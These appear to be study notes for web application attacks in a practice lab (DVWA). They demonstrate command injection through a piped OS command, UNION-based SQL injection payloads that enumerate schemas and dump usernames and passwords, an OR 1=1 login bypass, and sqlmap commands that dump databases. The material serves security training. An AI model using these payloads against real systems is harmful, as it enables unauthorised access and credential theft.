⚙️ Command Injection
📌 What is Command Injection?

When user input is passed directly to the system shell without validation, allowing attackers to execute OS commands.

🔬 Practical Demo (DVWA)

Login to DVWA

Set Security Level → Low

Go to Command Injection

Enter an IP:

8.8.8.8


✔️ Output shows ping result

➡️ This proves that whatever we input is executed in the backend OS

🧨 Command Injection Payloads

Pipe commands like in terminal:

8.8.8.8 | pwd


📌 This tells us the current directory of the server

💉 SQL Injection (SQLi)
🔍 SELECT Queries (Data Extraction)
SELECT * FROM users;
SELECT username, password FROM users;
SELECT * FROM users LIMIT 1;
SELECT * FROM users WHERE username='admin';
SELECT * FROM users WHERE username!='admin';
SELECT * FROM users WHERE username='admin' OR username='jon';
SELECT * FROM users WHERE username='admin' AND password='p4ssword';

🔎 Pattern Matching
SELECT * FROM users WHERE username LIKE 'a%';
SELECT * FROM users WHERE username LIKE '%n';
SELECT * FROM users WHERE username LIKE '%mi%';

🔗 UNION Based SQL Injection
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3
0 UNION SELECT 1,2,database()

🗂️ Extracting Table Names
0 UNION SELECT 1,2,
group_concat(table_name)
FROM information_schema.tables
WHERE table_schema='sqli_one';


📌 group_concat() merges multiple rows into one readable string

🧱 Extracting Column Names
0 UNION SELECT 1,2,
group_concat(column_name)
FROM information_schema.columns
WHERE table_name='staff_users';

🔑 Dumping Credentials
0 UNION SELECT 1,2,
group_concat(username,':',password SEPARATOR '<br>')
FROM staff_users;

🔓 Login Bypass Payload
' OR 1=1;-- 


✔️ 1=1 is always true
✔️ OR makes authentication succeed
✔️ -- comments out the rest of the query

🤖 SQLMap (Automated SQLi)
🔍 Help Menu
sqlmap -h

🌐 GET Method
sqlmap --url http://target.com/page.php?id=1 --dbs

📡 POST Method (Using Burp Suite)

Intercept request in Burp Suite

Save request as req.txt

Run:

sqlmap -r req.txt --dbs

📂 Enumerate Tables & Columns
sqlmap -r req.txt -D dvwa --tables
sqlmap -r req.txt -D dvwa --columns

💾 Dump Database
sqlmap -r req.txt -D dvwa --dump

